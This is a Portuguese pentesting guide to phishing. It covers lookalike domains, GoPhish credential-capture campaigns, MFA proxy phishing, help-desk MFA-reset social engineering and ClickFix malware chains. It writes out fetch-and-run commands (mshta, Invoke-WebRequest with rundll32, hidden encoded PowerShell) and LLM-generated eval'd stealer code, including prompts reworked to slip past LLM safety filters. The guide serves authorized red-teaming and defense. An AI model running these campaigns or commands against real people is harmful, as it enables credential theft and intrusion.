# Metodologia de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Faça o recon da vítima
   1. Selecione o **domínio da vítima**.
   2. Faça uma enumeração básica da web **procurando portais de login** usados pela vítima e **decida** qual deles você vai **imitar**.
   3. Use **OSINT** para **encontrar emails**.
2. Prepare o ambiente
   1. **Compre o domínio** que você vai usar na avaliação de phishing
   2. **Configure os registros relacionados ao serviço de email** (SPF, DMARC, DKIM, rDNS)
   3. Configure o VPS com **gophish**
3. Prepare a campanha
   1. Prepare o **template do email**
   2. Prepare a **página web** para roubar as credenciais
4. Lance a campanha!

## Gere nomes de domínio semelhantes ou compre um domínio confiável

### Técnicas de variação de nomes de domínio

- **Keyword**: O nome de domínio **contém** uma **keyword** importante do domínio original (por exemplo, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Troque o **ponto por um hífen** em um subdomínio (por exemplo, www-zelster.com).
- **New TLD**: Mesmo domínio usando um **novo TLD** (por exemplo, zelster.org)
- **Homoglyph**: **Substitui** uma letra no nome de domínio por **letras que se parecem** com ela (por exemplo, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Troca duas letras** dentro do nome de domínio (por exemplo, zelsetr.com).
- **Singularization/Pluralization**: Adiciona ou remove “s” no final do nome de domínio (por exemplo, zeltsers.com).
- **Omission**: **Remove uma** das letras do nome de domínio (por exemplo, zelser.com).
- **Repetition:** **Repete uma** das letras no nome de domínio (por exemplo, zeltsser.com).
- **Replacement**: Como Homoglyph, mas menos discreto. Substitui uma das letras no nome de domínio, talvez por uma letra próxima da original no teclado (por exemplo, zektser.com).
- **Subdomained**: Introduz um **ponto** dentro do nome de domínio (por exemplo, ze.lster.com).
- **Insertion**: **Insere uma letra** no nome de domínio (por exemplo, zerltser.com).
- **Missing dot**: Anexa o TLD ao nome de domínio. (por exemplo, zelstercom.com)

**Ferramentas automáticas**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Sites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Existe a **possibilidade de que alguns bits armazenados ou em comunicação sejam invertidos automaticamente** devido a vários fatores, como erupções solares, raios cósmicos ou erros de hardware.

Quando esse conceito é **aplicado a solicitações DNS**, é possível que o **domínio recebido pelo servidor DNS** não seja o mesmo que foi solicitado inicialmente.

Por exemplo, a alteração de um único bit no domínio "windows.com" pode transformá-lo em "windnws.com."

Os atacantes podem **tirar proveito disso registrando vários domínios com bitflipping** semelhantes ao domínio da vítima. A intenção é redirecionar usuários legítimos para a própria infraestrutura.

Para mais informações, leia [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Compre um domínio confiável

Você pode pesquisar em [https://www.expireddomains.net/](https://www.expireddomains.net) um domínio expirado que possa usar.\
Para garantir que o domínio expirado que você vai comprar **já tenha um bom SEO**, você pode verificar como ele está categorizado em:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Descobrir emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratuito)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratuito)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Para **descobrir mais** endereços de email válidos ou **verificar os que** você já encontrou, veja se é possível fazer brute-force nos servidores SMTP da vítima. [Saiba aqui como verificar/descobrir endereços de email](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Além disso, não se esqueça de que, se os usuários usarem **algum portal web para acessar seus emails**, você pode verificar se ele é vulnerável a **brute force de username** e explorar a vulnerabilidade, se possível.

## Configurando o GoPhish

### Instalação

Você pode baixá-lo em [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Baixe e descompacte-o em `/opt/gophish` e execute `/opt/gophish/gophish`\
Uma senha para o usuário admin na porta 3333 será exibida na saída. Portanto, acesse essa porta e use as credenciais para alterar a senha do admin. Talvez seja necessário criar um túnel para essa porta até a máquina local:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Configuração

**Configuração do certificado TLS**

Antes desta etapa, você já deve ter **comprado o domínio** que vai usar, e ele deve estar **apontando** para o **IP do VPS** em que você está configurando o **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Configuração de e-mail**

Comece instalando: `apt-get install postfix`

Depois, adicione o domínio aos seguintes arquivos:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Altere também os valores das seguintes variáveis em /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Por fim, modifique os arquivos **`/etc/hostname`** e **`/etc/mailname`** para usar o nome do seu domínio e **reinicie seu VPS.**

Agora, crie um **registro DNS A** de `mail.<domain>` apontando para o **endereço IP** do VPS e um **registro DNS MX** apontando para `mail.<domain>`

Agora vamos testar o envio de um e-mail:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Configuração do Gophish**

Interrompa a execução do Gophish e vamos configurá-lo.\
Modifique `/opt/gophish/config.json` para o seguinte (observe o uso de https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Configurar o serviço gophish**

Para criar o serviço gophish para que ele possa ser iniciado automaticamente e gerenciado como um serviço, você pode criar o arquivo `/etc/init.d/gophish` com o seguinte conteúdo:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Finalize a configuração do serviço e verifique-o fazendo:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Configurando o servidor de e-mail e o domínio

### Espere e seja legítimo

Quanto mais antigo for um domínio, menor a probabilidade de ele ser identificado como spam. Portanto, você deve esperar o máximo de tempo possível (pelo menos 1 semana) antes da avaliação de phishing. Além disso, se você publicar uma página sobre um setor de boa reputação, a reputação obtida será melhor.

Observe que, mesmo que você precise esperar uma semana, pode terminar de configurar tudo agora.

### Configure o registro Reverse DNS (rDNS)

Configure um registro rDNS (PTR) que resolva o endereço IP do VPS para o nome de domínio.

### Registro Sender Policy Framework (SPF)

Você deve **configurar um registro SPF para o novo domínio**. Se não sabe o que é um registro SPF, [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Você pode usar [https://www.spfwizard.net/](https://www.spfwizard.net) para gerar sua política SPF (use o IP da máquina VPS).

![Formulário do SPF Wizard para gerar um registro SPF para um domínio de phishing](<../../images/image (1037).png>)

Este é o conteúdo que deve ser definido em um registro TXT no domínio:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Registro de Domain-based Message Authentication, Reporting & Conformance (DMARC)

Você deve **configurar um registro DMARC para o novo domínio**. Se não sabe o que é um registro DMARC, [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Você precisa criar um novo registro DNS TXT apontando o hostname `_dmarc.<domain>` com o seguinte conteúdo:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Você deve **configurar um DKIM para o novo domínio**. Se não sabe o que é um registro DKIM, [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Este tutorial é baseado em: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Você precisa concatenar os dois valores B64 gerados pela chave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Teste a pontuação da configuração do seu e-mail

Você pode fazer isso usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Basta acessar a página e enviar um e-mail para o endereço fornecido:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Você também pode **verificar a configuração do seu e-mail** enviando um e-mail para `check-auth@verifier.port25.com` e **lendo a resposta** (para isso, você precisará **abrir** a porta **25** e verificar a resposta no arquivo _/var/mail/root_ se enviar o e-mail como root).\
Verifique se você passou em todos os testes:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Você também pode enviar **uma mensagem para uma conta do Gmail sob seu controle** e verificar os **cabeçalhos do email** na sua caixa de entrada do Gmail. `dkim=pass` deve estar presente no campo de cabeçalho `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Remoção da blacklist do Spamhouse

A página [www.mail-tester.com](https://www.mail-tester.com) pode informar se o seu domínio está sendo bloqueado pelo Spamhouse. Você pode solicitar a remoção do seu domínio/IP em: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Remoção da blacklist da Microsoft

​​Você pode solicitar a remoção do seu domínio/IP em [https://sender.office.com/](https://sender.office.com).

## Criar e lançar uma campanha do GoPhish

### Perfil de envio

- Defina um **nome para identificar** o perfil do remetente
- Decida de qual conta você enviará os emails de phishing. Sugestões: _noreply, support, servicedesk, salesforce..._
- Você pode deixar o nome de usuário e a senha em branco, mas marque Ignore Certificate Errors

![Criar e lançar uma campanha do GoPhish - Perfil de envio: Você pode deixar o nome de usuário e a senha em branco, mas marque Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Recomenda-se usar a funcionalidade "**Send Test Email**" para testar se tudo está funcionando.\
> Recomendo **enviar os emails de teste para endereços de email temporários de 10 minutos** para evitar entrar em uma blacklist durante os testes.

### Modelo de email

- Defina um **nome para identificar** o modelo
- Em seguida, escreva um **assunto** (nada estranho, apenas algo que você esperaria ler em um email comum)
- Certifique-se de marcar "**Add Tracking Image**"
- Escreva o **modelo de email** (você pode usar variáveis como no exemplo a seguir):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Observe que, **para aumentar a credibilidade do e-mail**, recomenda-se usar alguma assinatura de um e-mail do cliente. Sugestões:

- Envie um e-mail para um **endereço inexistente** e verifique se a resposta contém alguma assinatura.
- Procure **e-mails públicos**, como info@ex.com, press@ex.com ou public@ex.com, envie um e-mail e aguarde a resposta.
- Tente entrar em contato com algum e-mail válido **descoberto** e aguarde a resposta.

![Perfil de envio - Modelo de e-mail: tente entrar em contato com algum e-mail válido descoberto e aguarde a resposta](<../../images/image (80).png>)

> [!TIP]
> O modelo de e-mail também permite **anexar arquivos para envio**. Se você também quiser roubar desafios NTLM usando arquivos/documentos especialmente criados, [leia esta página](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Página de destino

- Defina um **nome**
- **Escreva o código HTML** da página da web. Observe que você pode **importar** páginas da web.
- Marque **Capture Submitted Data** e **Capture Passwords**
- Defina um **redirecionamento**

![Modelo de e-mail - Página de destino: marque Capture Submitted Data e Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Normalmente, será necessário modificar o código HTML da página e fazer alguns testes localmente (talvez usando um servidor Apache) **até gostar dos resultados.** Em seguida, escreva esse código HTML na caixa.\
> Observe que, se precisar **usar recursos estáticos** no HTML (talvez algumas páginas CSS e JS), você pode salvá-los em _**/opt/gophish/static/endpoint**_ e acessá-los em _**/static/\<filename>**_

> [!TIP]
> Para o redirecionamento, você pode **redirecionar os usuários para a página principal legítima** da vítima ou, por exemplo, redirecioná-los para _/static/migration.html_, exibir uma **roda giratória (**[**https://loading.io/**](https://loading.io)**) por 5 segundos e, em seguida, indicar que o processo foi concluído com sucesso**.

### Usuários e grupos

- Defina um nome
- **Importe os dados** (observe que, para usar o modelo do exemplo, você precisa do nome, sobrenome e endereço de e-mail de cada usuário)

![Página de destino - Usuários e grupos: importe os dados (observe que, para usar o modelo do exemplo, você precisa do nome, sobrenome e endereço de e-mail de cada usuário)](<../../images/image (163).png>)

### Campanha

Por fim, crie uma campanha selecionando um nome, o modelo de e-mail, a página de destino, a URL, o perfil de envio e o grupo. Observe que a URL será o link enviado às vítimas.

Observe que o **perfil de envio permite enviar um e-mail de teste para ver como ficará o e-mail de phishing final**:

![Usuários e grupos - Campanha: observe que o perfil de envio permite enviar um e-mail de teste para ver como ficará o e-mail de phishing final](<../../images/image (192).png>)

Quando tudo estiver pronto, basta iniciar a campanha!

## Clonagem de sites

Se, por algum motivo, você quiser clonar o site, consulte a página a seguir:


{{#ref}}
clone-a-website.md
{{#endref}}

## Documentos e arquivos com backdoor

Em algumas avaliações de phishing (principalmente para Red Teams), você também pode querer **enviar arquivos contendo algum tipo de backdoor** (talvez um C2 ou apenas algo que acione uma autenticação).\
Confira a página a seguir para ver alguns exemplos:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing de MFA

### Via Proxy MitM

O ataque anterior é bastante engenhoso, pois você falsifica um site real e coleta as informações inseridas pelo usuário. Infelizmente, se o usuário não inserir a senha correta ou se o aplicativo que você falsificou estiver configurado com 2FA, **essas informações não permitirão que você se passe pelo usuário enganado**.

É aqui que ferramentas como [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena) são úteis. Essa ferramenta permite gerar um ataque semelhante a MitM. Basicamente, os ataques funcionam da seguinte maneira:

1. Você **imita o formulário de login** da página da web real.
2. O usuário **envia** suas **credenciais** à sua página falsa, e a ferramenta as envia à página da web real, **verificando se as credenciais funcionam**.
3. Se a conta estiver configurada com **2FA**, a página MitM solicitará o código e, quando o **usuário o inserir**, a ferramenta o enviará à página da web real.
4. Depois que o usuário for autenticado, você, como atacante, terá **capturado as credenciais, o 2FA, o cookie e quaisquer informações de todas as interações realizadas enquanto a ferramenta executa um MitM**.

### Via VNC

E se, em vez de **enviar a vítima para uma página maliciosa** com a mesma aparência da original, você a enviasse para uma **sessão VNC com um navegador conectado à página da web real**? Você poderá ver o que ela faz e roubar a senha, o MFA usado, os cookies...\
Você pode fazer isso com [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detectando a detecção

Obviamente, uma das melhores maneiras de saber se você foi descoberto é **procurar seu domínio em listas de bloqueio**. Se ele estiver listado, de alguma forma seu domínio foi identificado como suspeito.\
Uma maneira fácil de verificar se seu domínio aparece em alguma lista de bloqueio é usar [https://malwareworld.com/](https://malwareworld.com)

No entanto, existem outras maneiras de saber se a vítima está **procurando ativamente por atividades de phishing suspeitas na internet**, conforme explicado em:


{{#ref}}
detecting-phising.md
{{#endref}}

Você pode **comprar um domínio com um nome muito parecido** com o domínio da vítima **e/ou gerar um certificado** para um **subdomínio** de um domínio controlado por você, **contendo** a **palavra-chave** do domínio da vítima. Se a **vítima** realizar algum tipo de **interação DNS ou HTTP** com eles, você saberá que **ela está procurando ativamente domínios suspeitos** e precisará agir com bastante discrição.<sup>[[2]](#references)</sup>

### Avalie o phishing

Use [**Phishious** ](https://github.com/Rices/Phishious)para avaliar se seu e-mail será enviado para a pasta de spam, bloqueado ou entregue com sucesso.

## Comprometimento de identidade de alto contato (redefinição de MFA pelo help desk)

Grupos de intrusão modernos cada vez mais ignoram totalmente as iscas por e-mail e **visam diretamente o fluxo de trabalho do service desk/recuperação de identidade** para contornar o MFA. O ataque é totalmente "living-off-the-land": assim que o operador obtém credenciais válidas, ele se movimenta usando ferramentas administrativas integradas — nenhum malware é necessário.<sup>[[6]](#references)</sup>

### Fluxo do ataque
1. Faça reconhecimento da vítima 
   * Colete dados pessoais e corporativos do LinkedIn, de vazamentos de dados, do GitHub público etc.  
   * Identifique identidades de alto valor (executivos, TI, finanças) e descubra o **processo exato do help desk** para redefinição de senha/MFA.
2. Engenharia social em tempo real  
   * Ligue, use o Teams ou converse com o help desk enquanto se passa pelo alvo (geralmente com **identificação de chamada falsificada** ou **voz clonada**).  
   * Forneça as informações pessoais identificáveis coletadas anteriormente para passar pela verificação baseada em conhecimento.  
   * Convença o agente a **redefinir o segredo do MFA** ou a realizar um **SIM swap** em um número de celular registrado.
3. Ações imediatas após o acesso (≤60 min em casos reais)  
   * Estabeleça uma presença por meio de qualquer portal SSO da web.  
   * Enumere o AD/AzureAD usando ferramentas integradas (sem deixar binários):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Movimentação lateral com **WMI**, **PsExec** ou agentes **RMM** legítimos já permitidos no ambiente.

### Detecção e mitigação
* Trate a recuperação de identidade pelo help desk como uma **operação privilegiada** – exija autenticação reforçada e aprovação do gerente.
* Implemente regras de **Identity Threat Detection & Response (ITDR)** / **UEBA** que alertem sobre:  
  * Método de MFA alterado + autenticação de um novo dispositivo / localidade geográfica.  
  * Elevação imediata do mesmo principal (usuário-→-admin).
* Grave as chamadas ao help desk e exija uma **ligação de retorno para um número já registrado** antes de qualquer redefinição.
* Implemente **Just-In-Time (JIT) / Privileged Access** para que as contas recém-redefinidas **não** herdem automaticamente tokens de alto privilégio.

---

## Engano em escala – SEO poisoning e campanhas “ClickFix”
Grupos criminosos comuns compensam o custo de operações de alto contato com ataques em massa que transformam **mecanismos de busca e redes de anúncios no canal de distribuição**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** promove um resultado falso, como `chromium-update[.]site`, no topo dos anúncios de busca.
2. A vítima baixa um pequeno **loader de primeiro estágio** (geralmente JS/HTA/ISO). Exemplos observados pela Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. O loader exfiltra cookies do navegador e bancos de dados de credenciais e, em seguida, baixa um **loader silencioso** que decide – *em tempo real* – se deve implantar:
   * RAT (por exemplo, AsyncRAT, RustDesk)
   * ransomware / wiper
   * componente de persistência (chave Run do registro + tarefa agendada)

### Dicas de hardening
* Bloqueie domínios recém-registrados e aplique **Advanced DNS / URL Filtering** a *anúncios de busca* e também ao e-mail.
* Restrinja a instalação de software a pacotes MSI assinados / da Store; bloqueie a execução de `HTA`, `ISO`, `VBS` por política.
* Monitore processos filhos de navegadores que abram instaladores:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Procure LOLBins frequentemente abusados por first-stage loaders (por exemplo, `regsvr32`, `curl`, `mshta`).

### Sequestro de cliques no botão de download com redirecionamento via TDS
Alguns portais de software falsos mantêm o `href` visível do download apontando para a URL **real** do GitHub/release, mas sequestram a **primeira** interação do usuário com JavaScript e enviam a vítima para uma cadeia de **Sistema de Distribuição de Tráfego (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Características principais:
- O hook geralmente é executado na **fase de captura** (`true`) em `document`, então é acionado antes dos handlers do site.
- O Chrome costuma usar `mousedown` em vez de `click` para manter o redirecionamento associado a um **gesto válido do usuário** e melhorar o bypass do bloqueador de pop-ups.
- Algumas variantes abrem previamente `about:blank` ou sintetizam cliques em `<a target="_blank">` e só depois atribuem a URL do TDS.
- Os limites do lado do navegador geralmente ficam em `localStorage`, então o **primeiro clique** pode levar ao malware, enquanto atualizações/repetições voltam ao link visível com aparência benigna.
- O TDS pode filtrar por referrer, domínio de entrada, GEO, fingerprint do navegador/dispositivo, verificações de VPN/datacenter, contexto do clique e contadores por sessão, tornando as reproduções por analistas não determinísticas.

Ideias para a defesa:
- Compare o `href` **exibido** com o destino de navegação **real** gerado no momento do clique.
- Procure handlers `document.addEventListener(..., true)` que chamem `preventDefault()` e `stopImmediatePropagation()` junto de `window.open`, `about:blank` ou cliques em âncoras sintéticas.
- Considere conjuntos de domínios de download de software recém-registrados que carregam o mesmo estágio CloudFront/JS como um padrão de envenenamento de SEO/TDS de alto sinal.

### ClickFix em páginas falsas de verificação + buscas de LOLBAS com aparência de arquivo compactado
Algumas ramificações do TDS terminam em uma página falsa de verificação (no estilo Cloudflare/IUAM) que instrui a vítima a executar um binário confiável do Windows, como:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notas:
- `mshta.exe` executa o **HTA/VBScript no início da resposta**, mesmo que a URL finja ser um arquivo `.7z`; os dados de arquivo anexados podem ser um simples chamariz.
- As etapas seguintes costumam continuar mentindo sobre o tipo de arquivo (`.rtf` para PowerShell, `.asar` para Python, ZIPs com binários preenchidos com dados) e depois passar para **manual PE mapping / execução em memória**.
- Se estiver respondendo a uma dessas cadeias, preserve **rede + memória desde a primeira execução bem-sucedida**: replays posteriores podem mostrar apenas um caminho benigno de instalador/SFX ou falhar porque a liberação do payload/chave estava vinculada à sessão TDS original.

### Tradecraft de entrega de DLL via ClickFix (atualização CERT falsa)
* Isca: aviso clonado de um CERT nacional com um botão **Update** que exibe instruções passo a passo de “correção”. As vítimas são instruídas a executar um batch que baixa uma DLL e a executa via `rundll32`.<sup>[[12]](#references)</sup>
* Cadeia típica de batch observada:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` grava o payload em `%TEMP%`, uma breve pausa oculta a variação da rede, e depois `rundll32` chama o ponto de entrada exportado (`notepad`).
* A DLL envia a identidade do host e consulta o C2 a cada poucos minutos. As tarefas remotas chegam como **PowerShell codificado em base64**, executado de forma oculta e com o bypass da política:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Isso preserva a flexibilidade de C2 (o servidor pode trocar tarefas sem atualizar a DLL) e oculta janelas do console. Procure processos filhos do PowerShell de `rundll32.exe` usando `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` em conjunto.
* Os defensores podem procurar callbacks HTTP(S) no formato `...page.php?tynor=<COMPUTER>sss<USER>` e intervalos de polling de 5 minutos após o carregamento da DLL.

---

## Operações de Phishing Aprimoradas por IA
Atacantes agora encadeiam **APIs de LLM e clonagem de voz** para iscas totalmente personalizadas e interação em tempo real.

| Camada | Exemplo de uso por agente de ameaça |
|-------|-----------------------------|
|Automação|Gerar e enviar >100 mil e-mails / SMS com texto aleatório e links de rastreamento.|
|IA generativa|Produzir e-mails *únicos* que mencionam fusões e aquisições públicas, piadas internas das redes sociais; voz deepfake de CEO em golpe de callback.|
|IA agêntica|Registrar domínios, coletar inteligência de código aberto e redigir autonomamente e-mails para a próxima etapa quando uma vítima clica, mas não envia credenciais.|

**Defesa:**  
• Adicione **banners dinâmicos** que destaquem mensagens enviadas por automação não confiável (por meio de anomalias em ARC/DKIM).  
• Implante **frases de desafio biométricas de voz** para solicitações telefônicas de alto risco.  
• Simule continuamente iscas geradas por IA em programas de conscientização – modelos estáticos estão obsoletos.

Veja também – abuso de navegação agêntica para phishing de credenciais:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Veja também – abuso de ferramentas CLI locais e MCP por agentes de IA (para inventário e detecção de segredos):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Montagem em tempo de execução de JavaScript de phishing assistida por LLM (geração de código no navegador)

Atacantes podem distribuir HTML aparentemente benigno e **gerar o stealer em tempo de execução** solicitando JavaScript a uma **API de LLM confiável** e, em seguida, executando-o no navegador (por exemplo, com `eval` ou `<script>` dinâmico).<sup>[[8]](#references)</sup>

1. **Prompt como ofuscação:** codifique URLs de exfiltração/strings Base64 no prompt; itere o texto para contornar filtros de segurança e reduzir alucinações.
2. **Chamada de API no cliente:** ao carregar, o JS chama um LLM público (Gemini/DeepSeek/etc.) ou um proxy CDN; somente o prompt/a chamada de API está presente no HTML estático.
3. **Montagem e execução:** concatene a resposta e execute-a (polimórfica a cada visita):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** o código gerado personaliza a isca (por exemplo, parsing de token do LogoKit) e envia as credenciais para o endpoint oculto no prompt.

**Características de evasão**
- O tráfego passa por domínios conhecidos de LLM ou proxies de CDN confiáveis; às vezes, usa WebSockets para se conectar a um backend.
- Não há payload estático; o JavaScript malicioso só existe após a renderização.
- Gerações não determinísticas produzem stealers **únicos** por sessão.

**Ideias de detecção**
- Execute sandboxes com JS habilitado; sinalize `eval` em runtime ou a criação dinâmica de scripts com origem em respostas de LLM.
- Procure por POSTs do front-end para APIs de LLM seguidos imediatamente por `eval`/`Function` no texto retornado.
- Gere alertas sobre domínios de LLM não autorizados no tráfego do cliente, seguidos de POSTs de credenciais.

---

## Variante de MFA Fatigue / Push Bombing – Redefinição forçada
Além do push-bombing clássico, os operadores simplesmente **forçam um novo registro de MFA** durante a ligação ao help desk, anulando o token existente do usuário. Qualquer prompt de login subsequente parece legítimo para a vítima.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

